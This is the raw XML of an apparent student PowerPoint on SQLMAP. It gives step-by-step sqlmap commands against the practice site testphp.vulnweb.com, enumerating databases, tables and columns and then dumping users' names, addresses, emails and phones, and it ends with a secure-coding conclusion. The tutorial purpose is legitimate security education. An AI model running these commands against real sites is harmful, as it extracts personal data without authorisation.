                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:b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13" name="Content Placeholder 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83B5B4E2-D2D1-42BD-2BE1-D7431ADEF491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1063752" y="1876926"/>
            <a:ext cx="9206227" cy="4523874"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3582878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9FF05-3168-85C9-FD27-126EB77A9460}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>Give next command: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:b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sqlmap -u </a:t>
            </a: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hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1</a:t>
            </a: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-D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" cap="none" spc="352" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>acuart</a:t>
            </a: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--tables</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Content Placeholder 4" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0ED4368-84FB-D0FB-5B29-BA2EA56D2A1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27017" y="2120900"/>
            <a:ext cx="8544316" cy="4051300"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1386934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8E12E-DF51-9B33-0607-9F26E9E0FB1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>Give next command: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:b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sqlmap -u </a:t>
            </a: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hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1</a:t>
            </a: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a:t>
            </a:r>
            <a:b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b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-D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" cap="none" spc="352" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>acuart</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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-T users --columns  </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Content Placeholder 4" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C9A1686-927E-AFF3-2435-5023BF701B6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76780" y="2120900"/>
            <a:ext cx="7844789" cy="4051300"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3871920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DBEC-62E8-6F38-A7CD-0730243C4177}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>Give next command: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:b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sqlmap -u </a:t>
            </a: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hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1</a:t>
            </a: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a:t>
            </a:r>
            <a:b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b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-D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" cap="none" spc="352" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>acuart</a:t>
            </a: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-T users –C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" cap="none" spc="352" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>name,address,email,phone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t> --dump</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Content Placeholder 4" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3AC99149-7ED9-85B2-BC7B-3C3B7F623CD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97003" y="1816100"/>
            <a:ext cx="9197993" cy="4447540"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2523501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6CB3C-2DE7-6409-4360-808450091FE7}"/>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D58CE3EA-B41D-B5C5-DA43-678AC9A3EAAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>SQL Injection remains a critical threat to web applications, and SQLMAP provides a powerful and automated way to detect and exploit such vulnerabilities. Through this project, the importance of secure coding practices, proper input validation, and regular security testing is emphasized. By understanding how SQLMAP works and simulating real-world attacks, developers and security professionals can strengthen defenses, reduce risks, and ensure better protection of sensitive data.</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71832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112</TotalTime>
  <Words>419</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>26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Bebas Neue Cyrillic</vt:lpstr>
      <vt:lpstr>Rockwell</vt:lpstr>
      <vt:lpstr>Rockwell Condensed</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Wood Type</vt:lpstr>
      <vt:lpstr>SQLMAP </vt:lpstr>
      <vt:lpstr>introduction</vt:lpstr>
      <vt:lpstr>Purpose </vt:lpstr>
      <vt:lpstr>Tools required </vt:lpstr>
      <vt:lpstr>Open fire fox in kali linux and search testphp copy that url  </vt:lpstr>
      <vt:lpstr>•Go To The Kali Lunix Open The Root Terminal. •GIVE THE COMMAND:  sqlmap -u HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1  --dbs </vt:lpstr>
      <vt:lpstr>Give next command:  sqlmap -u HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1  -D acuart --tables</vt:lpstr>
      <vt:lpstr>Give next command:  sqlmap -u HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1   -D acuart -T users --columns  </vt:lpstr>
      <vt:lpstr>Give next command:  sqlmap -u HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1   -D acuart -T users –C name,address,email,phone --dump</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Vodapally</dc:creator>
  <cp:lastModifiedBy>Ritesh Vodapally</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-12-03T12:13:08Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-12-03T14:05:19Z</dcterms:modified>
</cp:coreProperties>
</file>